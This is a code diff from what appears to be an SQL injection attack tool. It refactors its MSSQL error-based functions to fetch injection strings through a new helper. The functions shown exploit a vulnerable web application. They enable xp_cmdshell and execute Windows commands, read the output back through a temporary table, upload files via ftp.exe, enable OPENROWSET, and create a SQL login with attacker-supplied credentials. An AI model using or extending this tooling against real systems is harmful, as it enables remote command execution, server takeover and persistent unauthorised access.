@@ -324,20 +324,20 @@ class ErrorBased(QtCore.QThread):
 #============================[MSSQL FUNCTIONS ONLY]============================#
 #Enable xp_cmdshell request
     def enableXpCmdShell(self):
-        web.webRequest(self.vars, self.qstrings['mssql_error_based']['enable_xp_cmdshell'], True)
+        web.webRequest(self.vars, self.dbType('enable_xp_cmdshell'), True)
         self.msgSignal.emit("Enable xp_cmdshell request sent.")
 
 #xp_cmdshell - windows command execution    
     def xpCmdShell(self):
         #Delete tmp_table if already exist
-        web.webRequest(self.vars, self.qstrings['mssql_error_based']['drop_tmp_tbl'], True)
+        web.webRequest(self.vars, self.dbType('drop_tmp_tbl'), True)
         #Creating tmp table
-        web.webRequest(self.vars, self.qstrings['mssql_error_based']['create_tmp_tbl'], True)
+        web.webRequest(self.vars, self.dbType('create_tmp_tbl'), True)
         #Inserting xp_cmdshell output to temp table
-        query = self.buildQuery(self.qstrings['mssql_error_based']['insert_result'], {'cmd' : txtproc.strToHex(self.vars['cmd'])})
+        query = self.buildQuery(self.dbType('insert_result'), {'cmd' : txtproc.strToHex(self.vars['cmd'])})
         web.webRequest(self.vars, query, True)
         #Getting count of rows in temp table
-        query = self.buildQuery(self.qstrings['mssql_error_based']['tmp_count'])
+        query = self.buildQuery(self.dbType('tmp_count'))
         rowCount = web.webRequest(self.vars, query, False)
         if rowCount == "no_content":
             return
@@ -357,7 +357,7 @@ class ErrorBased(QtCore.QThread):
                 tNum = tQueue.get_nowait()
             except Exception:  
                 break
-            query = self.buildQuery(self.qstrings['mssql_error_based']['get_row'], {'num' : str(tNum)})
+            query = self.buildQuery(self.dbType('get_row'), {'num' : str(tNum)})
             cmdResult = web.webRequest(self.vars, query, False)
             if cmdResult == "no_content":
                 web.debug(sys._getframe().f_code.co_name + "() -> cmdResult")
@@ -371,7 +371,7 @@ class ErrorBased(QtCore.QThread):
 #Upload file using built-in ftp.exe 
     def uploadFile(self):
         ftpFiles = self.vars['ftpFiles']
-        execCmd = self.qstrings['mssql_error_based']['exec_cmdshell']
+        execCmd = self.dbType('exec_cmdshell')
         #del ..\temp\ftp.txt /Q
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
         web.webRequest(self.vars, query, True)
@@ -404,12 +404,12 @@ class ErrorBased(QtCore.QThread):
     
 #Enable OPENROWSET request
     def enableOpenrowset(self):
-        web.webRequest(self.vars, self.qstrings['mssql_error_based']['enable_openrowset'], True)
+        web.webRequest(self.vars, self.dbType('enable_openrowset'), True)
         self.msgSignal.emit("Enable OPENROWSET request sent.")
         
 #Add user request        
     def addSqlUser(self):
-        query =  self.buildQuery(self.qstrings['mssql_error_based']['add_sqluser'], 
+        query =  self.buildQuery(self.dbType('add_sqluser'), 
                                  {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
         web.webRequest(self.vars, query, True)
         self.msgSignal.emit("Add admin user request sent.")
